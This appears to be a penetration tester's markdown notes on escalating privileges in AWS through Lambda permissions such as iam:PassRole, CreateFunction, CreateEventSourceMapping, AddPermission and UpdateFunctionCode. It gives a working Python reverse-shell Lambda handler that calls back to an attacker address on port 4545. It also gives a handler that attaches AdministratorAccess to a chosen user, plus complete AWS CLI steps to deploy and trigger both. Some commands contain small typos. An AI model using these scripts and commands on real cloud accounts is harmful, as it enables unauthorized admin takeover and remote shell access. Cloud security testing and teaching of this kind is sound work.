---
title: Lambda
updated: 2023-01-04 07:35:37Z
created: 2023-01-04 04:26:08Z
latitude: 27.71724530
longitude: 85.32396050
altitude: 0.0000
---

## iam:PassRole | lambda:CreateFunction | lambda:InvokeFunction

With these privileges, an attacker can escalate privilege by passing an existing IAM role to a new lambda function that include code to any relevant programming language supported by AWS, and the code can be invoked through the AWS API.
For example, a reverse shell code which can be used by attacker.

```
// rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('ip',4545))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(['/bin/sh','-i'])
   time.sleep(900)
   return 0
```

Now zip the file: `zip "rev.zip" "rev.py"`

- Creating the lambda function
    - `aws lambda create-function --function-name my_function --runtime python3.9 --role <arn_of_lambda_role> --handler rev.lambda_handler --zip-file fileb://rev.zip`
- Invoking the function
    - `aws lambda invoke --function-name my_function output.txt`

There is also another Interesting way to get admin privilege in the compromised account if lambda has enough permission.
For example, attaching the admin policy to a user using the lambda function.

```
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

**Impact:** Direct privilege escalation to any lambda service role specified.

## iam:PassRole | lambda:CreateFunction | lambda:CreateEventSourceMapping

With these privileges, an attacker can escalate privileges by passing an existing IAM role to a new Lambda function and invoke the function without the need of `lambda:InvokeFunction`. For example, An attacker would create a DynamoDB table or use an existing one, to create an event source mapping for the lambda function pointing to that DynamoDB table. And they would either put an item into the table or wait for any other relevant method so that the lambda function is invoked.
`aws lambda create-function --function-name my_function --runtime python3.8 --role <arn_of_lambda_role> --handler lambda_function.lambda_handler --zip-file fileb://rev.zip`

*Where the rev.zip file is same to the reverse shell script from previous example*

The Next step depends whether the DynamoDB is being used in the account or not. If it is being used, just creating the event source mapping for the lambda function is enough (which will be shown below). But if it is not being used, the attacker will need to create a table with streaming enabled, for which they will require the following privilege, `dynamodb:PutItem` and `dynamodb:CreateTable`.

```
aws dynamodb create-table --table-name my_table \
    --attribute-definitions AttributeName=Test,AttributeType=S \
    --key-schema AttributeName=Test,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```

After the following command, the attacker will connect the lambda function and the DynanoDB table by creating an event source mapping with the following command:

- `aws lambda create-event-source-mapping --function-name my_function --event-source-arn <arn_of_dynamodb_table_stream> --enabled --starting-position LATEST`

Now that the Lambda function and the stream are linked, the attacker may use the DynamoDB stream to invoke the Lambda function. This may be accomplished by inserting an item into the DynamoDB table.

- `aws dynamodb put-item --table-name my_table --item Test={S="Random string"}`

The lambda function will be invoked, and the attacker will have administrative privilege over the AWS account.

**Impact:** Direct privilege escalation to the lambda service role specified.

## lambda:AddPermission

With this privilege, an attacker can grant themselves or any other compromised users any permissions.

- Add permission command
    - `aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<user arn>`
- Invoke Function
    - `aws lambda lambda invoke --function-name <func_name> /tmp/outout`

**Impact:** Direct privilege escalation to the lambda service role used by granting privileged permission to the attacker.

## lambda:UpdateFunctionCode

With this privileges, an attacker can update an existing lambda function with an IAM role attached to it. if the attacker does not have `lamda:InvokeFunction` they will need to wait until the function is invoked.

- `aws lambda update-function-code --function-name target_function --zip-file file:///my/lambda/code/rev.zip`

**Impact:** Direct Privilege escalation to the lambda service role used.